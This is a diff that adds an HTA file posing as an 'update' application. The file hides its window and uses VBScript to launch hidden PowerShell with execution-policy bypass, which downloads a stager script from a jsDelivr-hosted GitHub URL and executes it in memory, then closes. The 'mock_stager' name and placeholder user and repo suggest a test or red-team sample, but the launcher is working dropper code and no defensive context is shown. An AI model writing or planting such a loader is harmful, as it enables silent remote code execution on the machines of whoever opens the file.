@@ -1,1 +1,12 @@
-
+<html>
+<head>
+<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="update"
+              WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
+<script language="VBScript">
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell -w hidden -nop -ep bypass -c ""iex (irm 'https://cdn.jsdelivr.net/gh/<user>/<repo>@main/mock_stager.ps1')""", 0, False
+    window.close()
+</script>
+</head>
+<body></body>
+</html>
